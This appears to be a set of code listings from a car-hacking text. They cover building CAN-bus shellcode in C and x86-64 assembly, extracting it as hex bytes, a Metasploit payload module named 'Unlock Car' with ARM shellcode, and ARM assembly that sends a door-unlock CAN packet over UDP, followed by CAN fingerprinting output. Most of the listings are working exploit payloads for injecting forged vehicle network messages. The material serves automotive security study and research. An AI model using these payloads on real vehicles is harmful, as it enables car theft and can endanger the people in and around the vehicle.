["```\n--- temp_shell.c\n #include <sys/types.h>\n #include <sys/socket.h>\n #include <sys/ioctl.h>\n #include <net/if.h>\n #include <netinet/in.h>\n #include <linux/can.h>\n #include <string.h>\n\n int main(int argc, char *argv[]) {\n     int s;\n     struct sockaddr_can addr;\n\n     struct ifreq ifr;\n     struct can_frame frame;\n\n     s = socket(➊PF_CAN, SOCK_RAW, CAN_RAW);\n\n     strcpy(ifr.ifr_name, ➋\"vcan0\");\n     ioctl(s, SIOCGIFINDEX, &ifr);\n\n     addr.can_family = AF_CAN;\n     addr.can_ifindex = ifr.ifr_ifindex;\n\n     bind(s, (struct sockaddr *)&addr, sizeof(addr));\n\n➌    frame.can_id = 0x510;\n     frame.can_dlc = 8;\n     frame.data[1] = 0xFF;\n     while(1) {\n       write(s, &frame, sizeof(struct can_frame));\n➍      usleep(500000);\n     }\n }\n```", "```\n$ gcc -o temp_shellcode temp_shellcode.c\n$ ls -l temp_shell\n-rwxrwxr-x 1 craig craig 8722 Jan 6 07:39 temp_shell\n$ ./temp_shellcode\n```", "```\n$ candump vcan0\n  vcan0  ➊510   [8]   ➋5D  ➌FF  ➍40 00 00 00 00 00\n  vcan0   510   [8]    5D   FF    40 00 00 00 00 00\n  vcan0   510   [8]    5D   FF    40 00 00 00 00 00\n  vcan0   510   [8]    5D   FF    40 00 00 00 00 00\n```", "```\n/usr/include/asm/unistd_64.h\n```", "```\n--- temp_shell.S\nsection .text\nglobal _start\n\n_start:\n                             ; s = socket(PF_CAN, SOCK_RAW, CAN_RAW);\n  push 41                    ; Socket syscall from unistd_64.h\n  pop rax\n  push 29                    ; PF_CAN from socket.h\n  pop rdi\n  push 3                     ; SOCK_RAW from socket_type.h\n  pop rsi\n  push 1                     ; CAN_RAW from can.h\n  pop rdx\n  syscall\n  mov r8, rax                ; s / File descriptor from socket\n                             ; strcpy(ifr.ifr_name, \"vcan0\");\n  sub rsp, 40                ;  struct ifreq is 40 bytes\n  xor r9, r9                 ; temp register to hold interface name\n  mov r9, 0x306e616376       ; vcan0\n  push r9\n  pop qword [rsp]\n                             ; ioctl(s, SIOCGIFINDEX, &ifr);\n  push 16                    ; ioctrl from unistd_64.h\n  pop rax\n  mov rdi, r8                ; s / File descriptor\n  push 0x8933                ; SIOCGIFINDEX from ioctls.h\n  pop rsi\n  mov rdx, rsp               ; &ifr\n  syscall\n  xor r9, r9                 ; clear r9\n  mov r9, [rsp+16]           ; ifr.ifr_ifindex\n                             ; addr.can_family = AF_CAN;\n  sub rsp, 16                ; sizeof sockaddr_can\n  mov word [rsp], 29         ; AF_CAN == PF_CAN\n                             ; addr.can_ifindex = ifr.ifr_ifindex;\n  mov [rsp+4], r9\n                             ; bind(s, (struct sockaddr *)&addr,\nsizeof(addr));\n  push 49                    ; bind from unistd_64.h\n  pop rax\n  mov rdi, r8                ; s /File descriptor\n  mov rsi, rsp               ; &addr\n  mov rdx, 16                ; sizeof(addr)\n  syscall\n  sub rsp, 16                ; sizeof can_frame\n  mov word [rsp], 0x510      ; frame.can_id = 0x510;\n\n  mov byte [rsp+4], 8        ;  frame.can_dlc = 8;\n\n  mov byte [rsp+9], 0xFF     ;  frame.data[1] = 0xFF;\n                             ; while(1)\nloop:\n                             ; write(s, &frame, sizeof(struct can_frame));\n  push 1                     ; write from unistd_64.h\n  pop rax\n  mov rdi, r8                ; s / File descriptor\n  mov rsi, rsp               ; &frame\n  mov rdx, 16                ; sizeof can_frame\n  syscall\n                             ; usleep(500000);\n  push 35                    ; nanosleep from unistd_64.h\n  pop rax\n  sub rsp, 16\n  xor rsi, rsi\n  mov [rsp], rsi             ; tv_sec\n  mov dword [rsp+8], 500000  ; tv_nsec\n  mov rdi, rsp\n  syscall\n  add rsp, 16\n  jmp loop\n```", "```\n$ nasm -f elf64 -o temp_shell2.o temp_shell.S\n$ ld -o temp_shell2 temp_shell2.o\n$ ls -l temp_shell2\n-rwxrwxr-x 1 craig craig ➊1008 Jan  6 11:32 temp_shell2\n```", "```\n$ for i in $(objdump -d temp_shell2.o -M intel |grep \"^ \" |cut -f2); do echo\n-n '\\x'$i; done;echo\n\\x6a\\x29\\x58\\x6a\\x1d\\x5f\\x6a\\x03\\x5e\\x6a\\x01\\x5a\\x0f\\x05\\x49\\x89\\xc0\\x48\\x83\\\nxec\\x28\\x4d\\x31\\xc9\\x49\\xb9\\x76\\x63\\x61\\x6e\\x30\\x00\\x00\\x00\\x41\\x51\\x8f\\x04\\\nx24\\x6a\\x10\\x58\\x4c\\x89\\xc7\\x68\\x33\\x89\\x00\\x00\\x5e\\x48\\x89\\xe2\\x0f\\x05\\x4d\\\nx31\\xc9\\x4c\\x8b\\x4c\\x24\\x10\\x48\\x83\\xec\\x10\\x66\\xc7\\x04\\x24\\x1d\\x00\\x4c\\x89\\\nx4c\\x24\\x04\\x6a\\x31\\x58\\x4c\\x89\\xc7\\x48\\x89\\xe6\\xba\\x10\\x00\\x00\\x00\\x0f\\x05\\\nx48\\x83\\xec\\x10\\x66\\xc7\\x04\\x24\\x10\\x05\\xc6\\x44\\x24\\x04\\x08\\xc6\\x44\\x24\\x09\\\nxff\\x6a\\x01\\x58\\x4c\\x89\\xc7\\x48\\x89\\xe6\\xba\\x10\\x00\\x00\\x00\\x0f\\x05\\x6a\\x23\\\nx58\\x48\\x83\\xec\\x10\\x48\\x31\\xf6\\x48\\x89\\x34\\x24\\xc7\\x44\\x24\\x08\\x20\\xa1\\x07\\\nx00\\x48\\x89\\xe7\\x0f\\x05\\x48\\x83\\xc4\\x10\\xeb\\xcf\n```", "```\n\\x6a\\x29\\x58\\x6a\\x1d\\x5f\\x6a\\x03\\x5e\\x6a\\x01\\x5a\\x0f\\x05\\x49\\x89\\xc0\\x48\\x83\\\nxec\\x28\\x4d\\x31\\xc9\\x41\\xb9\\x30\\x00\\x00\\x00\\x49\\xc1\\xe1\\x20\\x49\\x81\\xc1\\x76\\\nx63\\x61\\x6e\\x41\\x51\\x8f\\x04\\x24\\x6a\\x10\\x58\\x4c\\x89\\xc7\\x41\\xb9\\x11\\x11\\x33\\\nx89\\x49\\xc1\\xe9\\x10\\x41\\x51\\x5e\\x48\\x89\\xe2\\x0f\\x05\\x4d\\x31\\xc9\\x4c\\x8b\\x4c\\\nx24\\x10\\x48\\x83\\xec\\x10\\xc6\\x04\\x24\\x1d\\x4c\\x89\\x4c\\x24\\x04\\x6a\\x31\\x58\\x4c\\\nx89\\xc7\\x48\\x89\\xe6\\xba\\x11\\x11\\x11\\x10\\x48\\xc1\\xea\\x18\\x0f\\x05\\x48\\x83\\xec\\\nx10\\x66\\xc7\\x04\\x24\\x10\\x05\\xc6\\x44\\x24\\x04\\x08\\xc6\\x44\\x24\\x09\\xff\\x6a\\x01\\\nx58\\x4c\\x89\\xc7\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x23\\x58\\x48\\x83\\xec\\x10\\x48\\x31\\xf6\\\nx48\\x89\\x34\\x24\\xc7\\x44\\x24\\x08\\x00\\x65\\xcd\\x1d\\x48\\x89\\xe7\\x0f\\x05\\x48\\x83\\\nxc4\\x10\\xeb\\xd4\n```", "```\n   Require 'msf/core'\n\n   module Metasploit3\n      include Msf::Payload::Single\n      include Msf::Payload::Linux\n\n     def initialize(info = {})\n       super(merge_info(info,\n         'Name'          => 'Unlock Car',\n         'Description'   => 'Unlocks the Driver Car Door over Ethernet',\n         'Author'        => 'Craig Smith',\n         'License'       => MSF_LICENSE,\n         'Platform'      => 'linux',\n         'Arch'          => ARCH_ARMLE))\n      end\n      def generate_stage(opts={})\n\n➊      payload = \"\\x02\\x00\\xa0\\xe3\\x02\\x10\\xa0\\xe3\\x11\\x20\\xa0\\xe3\\x07\\x00\\x2d\\\n   xe9\\x01\\x00\\xa0\\xe3\\x0d\\x10\\xa0\\xe1\\x66\\x00\\x90\\xef\\x0c\\xd0\\x8d\\xe2\\x00\\x60\\\n   xa0\\xe1\\x21\\x13\\xa0\\xe3\\x4e\\x18\\x81\\xe2\\x02\\x10\\x81\\xe2\\xff\\x24\\xa0\\xe3\\x45\\\n   x28\\x82\\xe2\\x2a\\x2b\\x82\\xe2\\xc0\\x20\\x82\\xe2\\x06\\x00\\x2d\\xe9\\x0d\\x10\\xa0\\xe1\\\n   x10\\x20\\xa0\\xe3\\x07\\x00\\x2d\\xe9\\x03\\x00\\xa0\\xe3\\x0d\\x10\\xa0\\xe1\\x66\\x00\\x90\\\n   xef\\x14\\xd0\\x8d\\xe2\\x12\\x13\\xa0\\xe3\\x02\\x18\\x81\\xe2\\x02\\x28\\xa0\\xe3\\x00\\x30\\\n   xa0\\xe3\\x0e\\x00\\x2d\\xe9\\x0d\\x10\\xa0\\xe1\\x0c\\x20\\xa0\\xe3\\x06\\x00\\xa0\\xe1\\x07\\\n   x00\\x2d\\xe9\\x09\\x00\\xa0\\xe3\\x0d\\x10\\xa0\\xe1\\x66\\x00\\x90\\xef\\x0c\\xd0\\x8d\\xe2\\\n   x00\\x00\\xa0\\xe3\\x1e\\xff\\x2f\\xe1\"\n      end\n   end\n```", "```\n      /* Grab a socket handler for UDP */\n      mov     %r0, $2 /* AF_INET */\n      mov     %r1, $2 /* SOCK_DRAM */\n      mov     %r2, $17        /* UDP */\n      push    {%r0, %r1, %r2}\n      mov     %r0, $1 /* socket */\n      mov     %r1, %sp\n      svc     0x00900066\n      add     %sp, %sp, $12\n\n      /* Save socket handler to %r6 */\n      mov     %r6, %r0\n\n      /* Connect to socket */\n      mov     %r1, $0x84000000\n      add     %r1, $0x4e0000\n      add     %r1, $2         /* 20100 & AF_INET */\n      mov     %r2, $0xff000000\n      add     %r2, $0x450000\n      add     %r2, $0xa800\n      add     %r2, $0xc0 /* 192.168.69.255 */\n      push    {%r1, %r2}\n      mov     %r1, %sp\n      mov     %r2, $16        /* sizeof socketaddr_in */\n      push    {%r0, %r1, %r2}\n      mov     %r0, $3 /* connect */\n      mov     %r1, %sp\n      svc     0x00900066\n      add     %sp, %sp, $20\n\n      /* CAN Packet */\n      /* 0000 0248 0000 0200 0000 0000 */\n      mov     %r1, $0x48000000  /* Signal */\n      add     %r1, $0x020000\n      mov     %r2, $0x00020000  /* 1st 4 bytes */\n      mov     %r3, $0x00000000  /* 2nd 4 bytes */\n      push    {%r1, %r2, %r3}\n      mov     %r1, %sp\n      mov     %r2, $12        /* size of pkt */\n\n      /* Send CAN Packet over UDP */\n      mov     %r0, %r6\n      push    {%r0, %r1, %r2}\n      mov     %r0, $9 /* send */\n      mov     %r1, %sp\n      svc     0x00900066\n      add     %sp, %sp, $12\n\n      /* Return from main - Only for testing, remove for exploit */\n      mov     %r0, $0\n      bx      lr\n```", "```\n{\"Make\": \"Unknown\", \"Model\": \"Unknown\", \"Year\": \"Unknown\", \"Trim\": \"Unknown\",\n\"Dynamic\": \"true\", \"Common\": [ { \"ID\": \"166\" },{ \"ID\": \"158\" },{ \"ID\": \"161\" },\n{ \"ID\": \"191\" },{ \"ID\": \"18E\" },{ \"ID\": \"133\" },{ \"ID\": \"136\" },{ \"ID\": \"13A\" },\n{ \"ID\": \"13F\" },{ \"ID\": \"164\" },{ \"ID\": \"17C\" },{ \"ID\": \"183\" },{ \"ID\": \"143\" },\n{ \"ID\": \"095\" } ], \"MainID\": \"143\", \"MainInterval\": \"0.009998683195847732\"}\n```", "```\n   $ bundle exec bin/c0f --logfile test/sample-can.log --print-stats\n     Loading Packets...   6158/6158  |*******************************************\n   *******|  0:00\n   Packet Count (Sample Size): 6158\n   Dynamic bus: true\n   [Packet Stats]\n    166 [4] interval 0.010000110772939828 count 326\n    158 [8] interval 0.009999947181114783 count 326\n    161 [8] interval 0.009999917103694035 count 326\n    191 [7] interval 0.009999932509202223 count 326\n    18E [3] interval 0.010003759677593524 count 326\n    133 [5] interval 0.0099989076761099 count 326\n    136 [8] interval 0.009998913544874925 count 326\n    13A [8] interval 0.009998914278470553 count 326\n    13F [8] interval 0.009998904741727389 count 326\n    164 [8] interval 0.009998898872962365 count 326\n    17C [8] interval 0.009998895204984225 count 326\n    183 [8] interval 0.010000821627103366 count 326\n➊  039 [2] interval 0.015191149488787786 count 215\n➋  143 [4] interval 0.009998683195847732 count 326\n    095 [8] interval 0.010001396766075721 count 326\n    1CF [6] interval 0.01999976016857006 count 163\n    1DC [4] interval 0.019999777829205548 count 163\n    320 [3] interval 0.10000315308570862 count 33\n    324 [8] interval 0.10000380873680115 count 33\n    37C [8] interval 0.09999540448188782 count 33\n    1A4 [8] interval 0.01999967775227111 count 163\n    1AA [8] interval 0.019999142759334967 count 162\n    1B0 [7] interval 0.019999167933967544 count 162\n    1D0 [8] interval 0.01999911758470239 count 162\n    294 [8] interval 0.039998024702072144 count 81\n    21E [7] interval 0.039998024702072144 count 81\n    309 [8] interval 0.09999731183052063 count 33\n    333 [7] interval 0.10000338862019201 count 32\n    305 [2] interval 0.1043075958887736 count 31\n    40C [8] interval 0.2999687910079956 count 11\n    454 [3] interval 0.2999933958053589 count 11\n    428 [7] interval 0.3000006914138794 count 11\n    405 [8] interval 0.3000005006790161 count 11\n    5A1 [8] interval 1.00019109249115 count 3\n```"]